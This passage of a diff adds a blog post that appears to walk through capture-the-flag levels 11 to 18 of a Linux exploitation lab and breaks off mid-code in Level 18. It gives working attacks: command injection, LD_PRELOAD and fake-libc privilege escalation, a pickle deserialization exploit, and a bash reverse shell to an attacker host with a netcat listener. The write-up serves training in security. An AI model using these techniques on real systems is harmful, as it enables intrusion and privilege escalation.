+  <li>We have to add this path to the variable <code class="language-plaintext highlighter-rouge">PATH</code>, so that it will be checked for executables before the proper bin path: <code class="language-plaintext highlighter-rouge">export PATH=/tmp/:$PATH</code>. To make sure we run the program until we get a properly null terminated line, which will run the command.</li>
+  <li>However, when we manage to execute the command the returned string says that we are not on the proper account. This is due to the fact that there is no call to setresuid/setresgid, meaning that everything will run as the real UID (level11) instead of the effective UID (flag11).</li>
+  <li>In the flag11 folder there is also a .ssh subfolder, which might be useful. If we manage to inject an authorized-key file here, we will have access to the flag11 account. To do this, we try to access the <code class="language-plaintext highlighter-rouge">process()</code> on the else-branch in the main function. The idea is to take control of the “unpredictable” path that will be created, and to force it to be a file containing our ssh key.</li>
+</ol>
+
+<p>At this point, I have to admit I am not entirely sure how this approach works: a nice <a href="https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9">writeup by graugans</a> gives the code and explains the idea a bit better, in case you want more details on how to proceed further.</p>
+
+<h3 id="level-12">[Level 12]</h3>
+<p>There is a backdoor process listening on port 50001.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s">"socket"</span><span class="p">)</span>
+<span class="n">local</span> <span class="n">server</span> <span class="o">=</span> <span class="n">assert</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">50001</span><span class="p">))</span>
+
+<span class="n">function</span> <span class="n">hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+    <span class="n">prog</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"echo "</span><span class="p">..</span><span class="n">password</span><span class="p">..</span><span class="s">" | sha1sum"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">prog</span><span class="o">:</span><span class="n">read</span><span class="p">(</span><span class="s">"*all"</span><span class="p">)</span>
+    <span class="n">prog</span><span class="o">:</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">data</span>
+<span class="n">end</span>
+
+<span class="k">while</span> <span class="mi">1</span> <span class="k">do</span>
+    <span class="n">local</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="o">:</span><span class="n">accept</span><span class="p">()</span>
+    <span class="n">client</span><span class="o">:</span><span class="n">send</span><span class="p">(</span><span class="s">"Password: "</span><span class="p">)</span>
+    <span class="n">client</span><span class="o">:</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+    <span class="n">local</span> <span class="n">line</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">client</span><span class="o">:</span><span class="n">receive</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">not</span> <span class="n">err</span> <span class="n">then</span>
+        <span class="n">print</span><span class="p">(</span><span class="s">"trying "</span> <span class="p">..</span> <span class="n">line</span><span class="p">)</span> <span class="o">--</span> <span class="n">log</span> <span class="n">from</span> <span class="n">where</span> <span class="p">;</span>\
+        <span class="n">local</span> <span class="n">h</span> <span class="o">=</span> <span class="n">hash</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">h</span> <span class="o">~=</span> <span class="s">"4754a4f4bd5787accd33de887b9250a0691dd198"</span> <span class="n">then</span>
+            <span class="n">client</span><span class="o">:</span><span class="n">send</span><span class="p">(</span><span class="s">"Better luck next time</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">else</span>
+            <span class="n">client</span><span class="o">:</span><span class="n">send</span><span class="p">(</span><span class="s">"Congrats, your token is 413**CARRIER LOST**</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">end</span>
+    <span class="n">end</span>
+
+    <span class="n">client</span><span class="o">:</span><span class="n">close</span><span class="p">()</span>
+<span class="n">end</span>
+</code></pre></div></div>
+
+<ol>
+  <li>Without knowing how Lua works, it is clear that an injection might happen in the <code class="language-plaintext highlighter-rouge">hash()</code> method, where the input is passed without sanitization to an instruction that clearly calls a shell command.</li>
+  <li>We can connect to the process using telnet: <code class="language-plaintext highlighter-rouge">telnet 127.0.0.1 50001</code>. We will be prompted for a password, and this is our opportunity.</li>
+  <li>We have to close the previous running command and run our own, so our password will be ``; /bin/getflag &gt; /tmp/flag12`.</li>
+  <li>The telnet connection will be closed because obviously we gave a wrong password, but if we check the /tmp/flag12 file we can see that our command has been executed properly (this worked because the command executed before the actual password check).</li>
+</ol>
+
+<h3 id="level-13">[Level 13]</h3>
+<p>A security check that prevents execution if the user invoking it does not match a specific user id.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define FAKEUID 1000
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">token</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="n">FAKEUID</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Security failure detected. UID %d started us, we expect %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getuid</span><span class="p">(),</span> <span class="n">FAKEUID</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"The system administrators will be notified of this violation</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// snip, sorry :)</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"your token is %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>uid_t getuid(void): the function returns the real user ID of the calling process.</p>
+</blockquote>
+
+<blockquote>
+  <p>LD_PRELOAD: this is an optional environmental variable containing paths to shared libraries that the loader will load before any other shared library including the C runtime library. Functions from preloaded libraries will be used before others of the same name in later libraries. This enables library functions to be intercepted and replaced.</p>
+</blockquote>
+
+<ol>
+  <li>It is pretty clear that there are not many possibilities to solve this challenge, because we can’t go around the code, and it allows no injection. Also, I don’t know of any way to modify the UID (and I hope no way actually exists). So we have to modify the behavior of the code.</li>
+  <li>We know that <code class="language-plaintext highlighter-rouge">getuid</code> is taken from a shared library, and therefore if we define <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> we should be able to overwrite it with a function with the same name but a different behavior. To do this we create a <code class="language-plaintext highlighter-rouge">fakelib.c</code> file with the following code: <code class="language-plaintext highlighter-rouge">int getuid() { return 1000; }</code></li>
+  <li>Compile this code using <code class="language-plaintext highlighter-rouge">gcc -shared -fPIC -o /home/level13/fake.so /home/level13/fake.c</code> (the -shared and -fPIC arguments are for position independent code).</li>
+  <li>We can’t run directly the flag13 program just after setting the <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> variable, because for security reasons SETUID programs discard that variable. However, in the code there is a snipped part, and it might very well be that that’s the part that will print out the token that we need. 5. This means that if we just copy the file (copy will not keep the SUID permission) and execute the copy with our library, we should get the password: <code class="language-plaintext highlighter-rouge">LD_PRELOAD=/tmp/fake.o ./flag13_copy</code></li>
+  <li>With the password we can access the flag13 account with <code class="language-plaintext highlighter-rouge">su</code> and execute <code class="language-plaintext highlighter-rouge">getflag</code></li>
+</ol>
+
+<h3 id="level-14">[Level 14]</h3>
+<p>Encrypting input and writeing it to stdout. An encrypted token is also in home directory.</p>
+
+<ol>
+  <li>
+    <p>We run the flag14 program with the <code class="language-plaintext highlighter-rouge">-e</code> parameter, and we see that it reads the standard input and writes a modified output of the same length. 2. Playing around a bit with inputs like “AAAAA” and “11111” shows that the encryption function is quite easy: to each element ASCII decimal value we add its position.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">def</span> <span class="nf">encr</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
+     <span class="n">r</span> <span class="o">=</span> <span class="p">[]</span>
+     <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+     <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
+         <span class="n">r</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+         <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
+     <span class="k">for</span> <span class="n">el</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
+         <span class="nf">print</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">el</span><span class="p">))</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>To decrypt the text that is in the token file, we need to write the opposite function: instead of adding its position to each element, we subtract it. As we are moving backwards, we have to remember to reverse the resulting output before printing it:</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">def</span> <span class="nf">decr</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
+     <span class="n">r</span> <span class="o">=</span> <span class="p">[]</span>
+     <span class="n">s</span> <span class="o">=</span> <span class="p">[]</span>
+     <span class="n">i</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span>
+     <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">d</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+         <span class="n">r</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span>
+         <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">-</span><span class="mi">1</span>
+     <span class="k">for</span> <span class="n">el</span> <span class="ow">in</span> <span class="n">r</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+         <span class="n">s</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">el</span><span class="p">))</span>
+     <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
+</code></pre></div>    </div>
+  </li>
+  <li>It’s not the most elegant solution ever, but if we feed the content of the token file to the <code class="language-plaintext highlighter-rouge">decr()</code> method, the result will be the password for the flag14 user.</li>
+  <li>At this point, it’s enough to use <code class="language-plaintext highlighter-rouge">su</code> to access the account and run <code class="language-plaintext highlighter-rouge">getflag</code></li>
+</ol>
+
+<h3 id="level-15">[Level 15]</h3>
+<p>strace the binary flag15 and see if you spot anything out of the ordinary.</p>
+
+<blockquote>
+  <p>strace: intercepts and records the system calls which are called by a given process and the signals which are received by a process. The name of each system call, its arguments and its return value are printed on stderr.</p>
+</blockquote>
+
+<blockquote>
+  <p>RPATH: this designates the run-time search path hard-coded in the header of an executable file. Dynamic linking loaders use the rpath to find required libraries. This path may override the system default dynamic linking search paths, and is not subject to the SUID restriction like LD_PRELOAD. The content of the variable can be seen with objdump -p [filename] in the dynamic section.</p>
+</blockquote>
+
+<blockquote>
+  <p>Relocation table: this table is a list of pointers stored in the executable file. Each entry in the table points to an absolute address in the object code that must be changed when the loader relocates the program so that it will refer to the correct location (for example of a library function). This table can be seen with objdump -R [filename]</p>
+</blockquote>
+
+<ol>
+  <li>We are told to run <code class="language-plaintext highlighter-rouge">strace</code> on flag15, and by doing that we can see that the program is trying to load the library “libc.so.6” from a bunch of locations. This suggests an approach similar to the one of Level13, but the SUID limiation forces us to take another road.</li>
+  <li>From all the data dumped with strace, we can see that one of the locations where the program looks for the library is /var/tmp/flag15. If we look at that folder permissions we can see that it’s writable, and a look at the file15 file with <code class="language-plaintext highlighter-rouge">objdump -p</code> confirms that it’s where we should try to put the file. So let’s <code class="language-plaintext highlighter-rouge">touch /var/tmp/flag15/libc.so.6</code> and run the program again (this time without strace).</li>
+  <li>Running the program shows that flag15 found our library, but obviously it’s complaining that there is nothing useful in it. Therefore we can find out which methods should be in there and implement one with something useful for us.</li>
+  <li>To do that we can look in the relocation table which functions are needed, using <code class="language-plaintext highlighter-rouge">objdump -R</code>. From the resulting list, <code class="language-plaintext highlighter-rouge">__libc_start_main</code> seems like the most promising method: after some googling, it turns out that it’s used to call main, meaning that whatever it does will happen as first, reducing the chance of problems.</li>
+  <li>
+    <p>As we did in Level13, we create a <code class="language-plaintext highlighter-rouge">fake.c</code> file containing a fake implementation of <code class="language-plaintext highlighter-rouge">__libc_start_main</code>. Remember however to use the proper signature of the function, with the correct arguments and return type. The content of the function should be a call to system() to spawn a shell for us:</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kt">int</span> <span class="nf">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">),</span> <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">))</span> <span class="p">{</span>
+     <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+ <span class="p">}</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Then compile the file with <code class="language-plaintext highlighter-rouge">gcc -shared -fPIC -o /var/tmp/flag15/libc.so.6 /tmp/fake15.c</code> and try running flag15 again.</li>
+  <li>The error that we get this time means two things: that symbol <code class="language-plaintext highlighter-rouge">__cxa_finalize</code> is undefined, and that we are missing the version of the library. 8. The first problem is solved by inserting an implementation for the <code class="language-plaintext highlighter-rouge">__cxa_finalize</code> method in our fake library. It doesn’t have to do anything, just give it a return statement and that’s enough.</li>
+  <li>The second problem requires us to create a version file containing <code class="language-plaintext highlighter-rouge">GLIBC_2.0 {}</code>. We have now to recompile our library passing the version file: <code class="language-plaintext highlighter-rouge">gcc -shared -fPIC -Wl,--version-script=/tmp/version -o /var/tmp/flag15/libc.so.6 /tmp/fake15.c</code></li>
+  <li>Running flag15 now says that system is not defined. We do not want to rewrite its implementation, as we want it to work propely to call getflag. So instead of inserting it in our library, we decide to use static linking, meaning that the function will be copied in our compiled library instead of being accessed invoking an external library. To do this, we use <code class="language-plaintext highlighter-rouge">-Bstatic</code> and <code class="language-plaintext highlighter-rouge">-static-libgcc</code> to tell gcc to not link against shared libraries: <code class="language-plaintext highlighter-rouge">gcc -shared -static-libgcc -fPIC -Wl,--version-script=/tmp/version,-Bstatic -o /var/tmp/flag15/libc.so.6 /tmp/fake15.c</code></li>
+  <li>Running flag15 again results in a sh session. If we run <code class="language-plaintext highlighter-rouge">whoami</code> we can see that we are in fact user flag15, and therefore we can run <code class="language-plaintext highlighter-rouge">getflag</code> successfully.</li>
+</ol>
+
+<h3 id="level-16">[Level 16]</h3>
+<p>There is a perl script running on port 1616.</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env perl</span>
+
+    <span class="k">use</span> <span class="nv">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
+    <span class="k">print</span> <span class="p">"</span><span class="s2">Content-type: text/html</span><span class="se">\n\n</span><span class="p">";</span>
+
+    <span class="k">sub </span><span class="nf">login</span> <span class="p">{</span>
+        <span class="nv">$username</span> <span class="o">=</span> <span class="vg">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="vg">$_</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+        <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">tr/a-z/A-Z/</span><span class="p">;</span> <span class="c1"># conver to uppercase</span>
+        <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>        <span class="c1"># strip everything after a space</span>
+
+        <span class="nv">@output</span> <span class="o">=</span> <span class="p">`</span><span class="sb">egrep "^</span><span class="si">$username</span><span class="sb">" /home/flag16/userdb.txt 2&gt;&amp;1</span><span class="p">`;</span>
+        <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span>
+            <span class="p">(</span><span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pw</span><span class="p">)</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/:/</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span>
+        
+            <span class="k">if</span><span class="p">(</span><span class="nv">$pw</span> <span class="o">=~</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">sub </span><span class="nf">htmlz</span> <span class="p">{</span>
+        <span class="k">print</span><span class="p">("</span><span class="s2">Login resuls</span><span class="p">");</span>
+        <span class="k">if</span><span class="p">(</span><span class="vg">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">print</span><span class="p">("</span><span class="s2">Your login was accepted</span><span class="p">");</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">print</span><span class="p">("</span><span class="s2">Your login failed</span><span class="p">");</span>
+        <span class="p">}</span>    
+        <span class="k">print</span><span class="p">("</span><span class="s2">Would you like a cookie?</span><span class="se">\n</span><span class="p">");</span>
+    <span class="p">}</span>
+
+    <span class="nv">htmlz</span><span class="p">(</span><span class="nv">login</span><span class="p">(</span><span class="nv">param</span><span class="p">("</span><span class="s2">username</span><span class="p">"),</span> <span class="nv">param</span><span class="p">("</span><span class="s2">password</span><span class="p">")));</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>egrep: this command searches for a pattern using extended regular expressions, and returns all the lines matching that pattern.</p>
+</blockquote>
+
+<ol>
+  <li>The injection vulnerability in this program is where the <code class="language-plaintext highlighter-rouge">egrep</code> command is called. We need to properly close that command and append our own to get a system call to <code class="language-plaintext highlighter-rouge">getflag</code>. However, the input is partially sanitized, by making all of it uppercase and trimming it after the fisrt space.</li>
+  <li>We can’t call any useful command given the sanitization on the input, but what we can do is put those commands in a file with a name that is accepted by the sanitizatoin, and that access that file. To do this, the file name should be completely uppercase without spaces. We can put it in the tmp folder, and then access it using a wildcard, like <code class="language-plaintext highlighter-rouge">/*/FLAG16</code>.</li>
+  <li>The content of our file whould be a reverse tcp to which we can connect. The instruction goes like this: <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/[HOST IP]]/8000 0&gt;&amp;1</code>. This will spawn an interactive bash shell and pipe its input and output to a socket connected to our host. Give it running permissions with <code class="language-plaintext highlighter-rouge">chmod +x [filename]</code></li>
+  <li>On the host we start netcat so that we can listen and connect to our shell: <code class="language-plaintext highlighter-rouge">nc -nlp 8000</code></li>
+  <li>What is left to do is connecting to the server with the proper request so that our script will be invoked and we get the connection on the netcat listener. We know that the server is expecting a request to index.cgi with two parameters: username and password. Username is what we are interested in, so we put our URL encoded script path in there: <code class="language-plaintext highlighter-rouge">wget "[VM IP]:1616/index.cgi?username=%60%2F%2A%2FFLAG16%60&amp;password=asdf"</code></li>
+  <li>This request should stay open, and if you switch to the netcat listener there should be a shell with flag16 as user open and waiting for the <code class="language-plaintext highlighter-rouge">getflag</code> command. After executing it, as soon as you leave the shell also the wget request should end successfully.</li>
+</ol>
+
+<h3 id="level-17">[Level 17]</h3>
+<p>There is a python script listening on port 10007 that contains a vulnerability.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">pickle</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">signal</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="n">signal</span><span class="p">.</span><span class="n">SIG_IGN</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">server</span><span class="p">(</span><span class="n">skt</span><span class="p">):</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">skt</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+        <span class="n">clnt</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">why did you send me </span><span class="sh">"</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="sh">"</span><span class="s">?</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">skt</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">skt</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="mi">10007</span><span class="p">))</span>
+<span class="n">skt</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">clnt</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">skt</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
+
+    <span class="nf">if</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
+        <span class="n">clnt</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">Accepted connection from %s:%d</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+        <span class="nf">server</span><span class="p">(</span><span class="n">clnt</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>pickle.loads(string): read a pickled object hierarchy from a string. Characters in the string past the pickled object’s representation are ignored. The pickle module is not intended to be secure against erroneous or maliciously constructed data.
+Pickle allows arbitrary objects to declare how they should be pickled by defining a <strong>reduce</strong> method, which should return a tuple describing how to reconstruct this object on unpacking. That tuple should just contain a callable and a tuple of arguments to call that callable on. Each of these pieces will be pickled separately, and then on unpickling, the callable will be called on the provided arguments to construct the new object.</p>
+</blockquote>
+
+<ol>
+  <li>We can see that our input will be passed unsanitized to a <code class="language-plaintext highlighter-rouge">pickle.loads()</code> instruction. After a quick research it is clear that pickle is vulnerable to crafted inputs because it will call whatever will be passed to it. That’s what we want to exploit.</li>
+  <li>
+    <p>The command to be run is pretty simple, and it’s saved in a bash file that is called flag17 and that has executable permissions (<code class="language-plaintext highlighter-rouge">chmod +x</code>):</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">#!/bin/bash</span>
+ /bin/getflag <span class="o">&gt;&gt;</span> /tmp/flag17.out
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>To be successful in our exploit we have to rewrite the <code class="language-plaintext highlighter-rouge">__reduce__</code> method so that when invoked it will run the flag17 script for us. Also, we want our method to be sent to the local server so that it will actually execute. For this we write a small python program that implements <code class="language-plaintext highlighter-rouge">__reduce__</code>, opens a socket connection to the server and sends our specially crafted object. Remember to not call this file pickly.py or any name that could cause confusion with libraries.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">pickle</span>
+ <span class="kn">import</span> <span class="n">subprocess</span>
+ <span class="kn">import</span> <span class="n">socket</span>
+
+ <span class="k">class</span> <span class="nc">Exploit</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+
+     <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+         <span class="nf">return</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">,</span> <span class="p">((</span><span class="sh">'</span><span class="s">/tmp/flag17</span><span class="sh">'</span><span class="p">,),))</span>
+
+ <span class="n">host</span> <span class="o">=</span> <span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span>
+ <span class="n">port</span> <span class="o">=</span> <span class="mi">10007</span>
+
+ <span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nc">Exploit</span><span class="p">())</span>
+
+ <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Execute the python file, and after succesfully sending our packet we can check in <code class="language-plaintext highlighter-rouge">/tmp/flag17.out</code> and we will find that <code class="language-plaintext highlighter-rouge">getflag</code> has been successfully executed for us.</li>
+</ol>
+
+<h3 id="level-18">[Level 18]</h3>
+<p>Analyse the C program, and look for vulnerabilities in the program.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="p">{</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">debugfile</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">verbose</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">globals</span><span class="p">;</span>
+
+<span class="cp">#define dprintf(...) if(globals.debugfile) \
+    fprintf(globals.debugfile, __VA_ARGS__)
+#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \
+    fprintf(globals.debugfile, __VA_ARGS__)
+</span>
+<span class="cp">#define PWFILE "/home/flag18/password"
+</span>
+<span class="kt">void</span> <span class="nf">login</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">pw</span><span class="p">){</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+
+    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">PWFILE</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">char</span> <span class="n">file</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
